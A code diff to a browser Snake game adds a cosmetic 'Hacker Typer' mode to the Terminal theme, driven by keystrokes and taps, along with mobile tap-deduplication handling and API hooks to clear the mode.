     function reset() {
       var cx = Math.floor(cols / 2);
       var cy = Math.floor(rows / 2);
@@ -193,6 +910,7 @@
       wrapFlash = null;
       crashCell = null;
       lastResumeAt = -Infinity; // a new run always allows an immediate first pause
+      clearHack();
       placeFood();
     }
 
@@ -293,8 +1011,10 @@
 
       if (nx === food.x && ny === food.y) {
         score += 1;
-        grow += growthEff();
-        placeFood();
+        // During Hacker Typer, each planned route cell is normal visible food,
+        // but contributes exactly one growth block regardless of current mode.
+        grow += hackMovementStep ? 1 : growthEff();
+        if (!hackMovementStep) placeFood();
         emit('score', score);
       }
 
@@ -460,6 +1180,7 @@
       cell = Math.min(cssW / cols, cssH / rows);
       ox = (cssW - cell * cols) / 2;
       oy = (cssH - cell * rows) / 2;
+      positionHackGlasses();
       dirty = false;
       draw();
     }
@@ -530,7 +1251,31 @@
       if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.tagName === 'SELECT' || t.isContentEditable)) return;
       if (document.querySelector && document.querySelector('dialog[open]')) return;
       var key = (e.key || '').toLowerCase();
+      var isArrow = (key === 'arrowup' || key === 'arrowdown' || key === 'arrowleft' || key === 'arrowright');
+      var isWasd = (key === 'w' || key === 'a' || key === 's' || key === 'd');
       var d = KEYMAP[key];
+
+      if (isHacking) {
+        if (key === 'escape') {
+          e.preventDefault();
+          clearHack();
+          return;
+        }
+        if (isArrow && d) {
+          // Arrow keys at ANY time start the game!
+          e.preventDefault();
+          clearHack();
+          if (!started) start();
+          if (running) pushDir(d);
+          return;
+        }
+        // Any other key typed while hacking (space, enter, wasd, letters, digits, symbols):
+        // advance the code generation and NEVER stop coding or start the snake!
+        e.preventDefault();
+        typeHack();
+        return;
+      }
+
       if (d) {
         if (paused) {
           // A steering key on the pause screen (or the quit-confirm screen) is
@@ -546,6 +1291,15 @@
         if (running) pushDir(d);
         return;
       }
+
+      // If we are idle/before a run in the Terminal theme, typing any printable key (other than space/enter/wasd/arrows) starts hacker code generation!
+      if (!running && !started && isTerminalTheme()) {
+        if (key.length === 1 && key !== ' ' && !isWasd) {
+          typeHack();
+          return;
+        }
+      }
+
       if (key === ' ' || key === 'enter') {
         // Preserve native keyboard activation for every button and link.
         if (t && t.closest && t.closest('button, a, [role="button"]')) return;
@@ -559,16 +1313,58 @@
       return running && !paused && !document.querySelector('dialog[open]');
     }
 
+    // Mobile browsers vary between Touch Events, Pointer Events and synthetic
+    // clicks. Route every tap through this one handler and deduplicate the
+    // follow-up events so one physical tap adds exactly one code chunk.
+    var lastTerminalTapAt = -Infinity;
+    function handleTerminalTap(target, source) {
+      // The Ready overlay covers the canvas before a run starts; it is still
+      // inside .screen, so a tap there must count as a tap in the playfield.
+      var inField = target && target.closest ? target.closest('.snake-field, .screen') : null;
+      var now = Date.now();
+      // pointerdown -> touchstart is normally less than 80ms; the synthetic
+      // click after a touch can arrive ~300ms later. Deduplicate those event
+      // representations without suppressing deliberate rapid repeated taps.
+      if (source === 'touchstart' && now - lastTerminalTapAt < 80) return true;
+      if ((source === 'click' || source === 'pointerdown') && now - lastTerminalTapAt < 650) return true;
+
+      var handled = false;
+      if (isHacking) {
+        if (inField) typeHack();
+        else clearHack();
+        handled = true;
+      } else if (!running && !started && isTerminalTheme() && inField) {
+        typeHack();
+        handled = true;
+      }
+      if (handled) lastTerminalTapAt = now;
+      return handled;
+    }
+
     function onTouchStart(e) {
       touch = null;
-      if (!acceptsTouch() || !e.touches || e.touches.length !== 1) return;
       var target = e.target;
+      // Terminal Hacker Typer taps count as input keys; tapping off the box
+      // clears the session. Return before ordinary swipe capture.
+      if (handleTerminalTap(target, 'touchstart')) return;
+
+      if (!acceptsTouch() || !e.touches || e.touches.length !== 1) return;
       var control = target && target.closest ? target.closest('input, textarea, select, [contenteditable], dialog') : null;
       if (control && !control.disabled) return;
       var finger = e.touches[0];
       touch = { id: finger.identifier, x: finger.clientX, y: finger.clientY };
       // Do not cancel touchstart: taps must still generate clicks on buttons.
     }
+
+    // Some mobile webviews omit Touch Events but still emit Pointer Events.
+    // Catch touch pointerdown as an early fallback; the shared timestamp
+    // deduplicates the subsequent touchstart/up/click events from that same tap.
+    document.addEventListener('pointerdown', function (e) {
+      if (e.pointerType === 'touch') handleTerminalTap(e.target, 'pointerdown');
+    }, true);
+    document.addEventListener('click', function (e) {
+      handleTerminalTap(e.target, 'click');
+    });
 
     function onTouchMove(e) {
       if (!acceptsTouch()) { touch = null; return; }
@@ -693,7 +1489,10 @@
       quit: function () {
         if (started) { crashCell = null; die(); }
       },
+      clearHack: clearHack,
+      isHacking: function () { return isHacking; },
       setTheme: function (t) {
+        clearHack();
         if (started || !t) return;
         for (var k in DEFAULT_THEME) {
           theme[k] = Object.prototype.hasOwnProperty.call(t, k) && t[k] !== undefined ? t[k] : DEFAULT_THEME[k];
